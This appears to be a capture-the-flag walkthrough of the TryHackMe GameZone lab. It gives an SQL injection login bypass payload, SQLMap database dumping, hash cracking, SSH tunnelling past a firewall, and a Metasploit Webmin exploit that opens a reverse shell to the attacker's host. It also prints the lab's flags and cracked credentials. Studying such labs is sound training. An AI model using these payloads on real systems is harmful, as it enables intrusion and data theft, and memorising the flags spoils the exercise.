## Obtain access via SQLi

SQL is a standard language for storing, editing, and retrieving data in databases. A query can look like this:

**SELECT * FROM users WHERE username = :username AND password = :password**

In our GameZone machine, when you attempt to log in, it will take your inputted values from your username and password, then insert them directly into the query above. If the query finds data, you'll be allowed to log in; otherwise, it will display an error message.

Let's use what we've learned above to manipulate the query and log in without any legitimate credentials.

If we set our username as "admin" and our password as **' or 1=1 -- -**, it will insert this into the query and authenticate our session.

The SQL query that now gets executed on the web server is as follows:

**SELECT * FROM users WHERE username = 'admin' AND password = '' or 1=1 -- -**

The extra SQL we inputted as our password has changed the above query to bypass the initial query and proceed (with the admin user) if 1=1, then comment the rest of the query to prevent it from breaking.

GameZone doesn't have an admin user in the database; however, you can still log in without knowing any credentials using the inputted password data we used in the previous question.

Use **' or 1=1 -- -** as your username and leave the password blank.

When you've logged in, what page do you get redirected to? `portal.php`

## Using SQLMap

Using the page we logged into earlier, we're going point SQLMap to the game review search feature.  

First we need to intercept a request made to the search feature using [BurpSuite](https://tryhackme.com/room/learnburp).  

 ![](https://i.imgur.com/ox4wJVH.png)  

Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session.

![](https://i.imgur.com/W5boKpk.png)

**-r** uses the intercepted request you saved earlier  
**--dbms** tells SQLMap what type of database management system it is  
**--dump** attempts to outputs the entire database

![](https://i.imgur.com/iiQ7g9t.png)

SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.

In the users table, what is the hashed password?
What was the username associated with the hashed password?
```
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

```

What was the other table name?
```
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                     
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                 
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

## Cracking a password with JohnTheRipper

If you are using a low-powered laptop, you can deploy a high-spec'd Kali Linux machine on TryHackMe and control it in your browser.

Once you have JohnTheRipper installed, you can run it against your hash using the following arguments:

![JohnTheRipper Usage](https://i.imgur.com/64g6Y8F.png)

**hash.txt** - contains a list of your hashes (in your case, it's just 1 hash).  
**--wordlist** - is the wordlist you're using to find the dehashed value.  
**--format** - is the hashing algorithm used. In our case, it's hashed using SHA256.

What is the dehashed password?  
`videogamer124`

Now you have a password and username. Try SSH'ing onto the machine.

What is the user flag?  
`649ac17b1480ac13ef1e4fa579dac95c`

## Exposing services with reverse SSH tunnels

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

**-L** is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do **ssh -L 9000:imgur.com:80 [user@example.com](mailto:user@example.com)**. Going to localhost:9000 on your machine will load imgur traffic using your other server.

**-R** is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above but in reverse.

![SSH Tunnel Diagram](https://i.imgur.com/cYZsC8p.png)

I will use a tool called **ss** to investigate sockets running on a host.

If I run **ss -tulpn**, it will tell us what socket connections are running.



|**Argument**|**Description**|
|---|---|
|-t|Display TCP sockets|
|-u|Display UDP sockets|
|-l|Displays only listening sockets|
|-p|Shows the process using the socket|
|-n|Doesn't resolve service names|


```
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
udp    UNCONN     0      0         *:10000                 *:*                  
udp    UNCONN     0      0         *:68                    *:*                  
tcp    LISTEN     0      80     127.0.0.1:3306                  *:*                  
tcp    LISTEN     0      128       *:10000                 *:*                  
tcp    LISTEN     0      128       *:22                    *:*                  
tcp    LISTEN     0      128      :::80                   :::*                  
tcp    LISTEN     0      128      :::22                   :::*                  

```         

I can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, using an SSH tunnel, we can expose the port to us (locally)!

From our local machine, run `ssh -L 10000:localhost:10000 <username>@<ip>`.

Once complete, in your browser, type "localhost:10000," and you can access the newly exposed web server.

![Webmin CMS](https://i.imgur.com/9vJZUZv.png)

What is the name of the exposed CMS?  
`Webmin`

What is the CMS version?  
Login with the credentials above.  
`1.580`

## Privilege Escalation with Metasploit

Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.

What is the root flag?

1. Open Metasploit.
2. Use the following commands:
`use exploit/unix/webapp/webmin_show_cgi_exec set RHOSTS localhost set USERNAME agent47 set PASSWORD videogamer124 set SSL false set PAYLOAD cmd/unix/reverse set LHOST [local ip] exploit`

`a4b945830144bdd71908d12d902adeee`

Note: Please make sure to replace `[local ip]` with your actual local IP address.
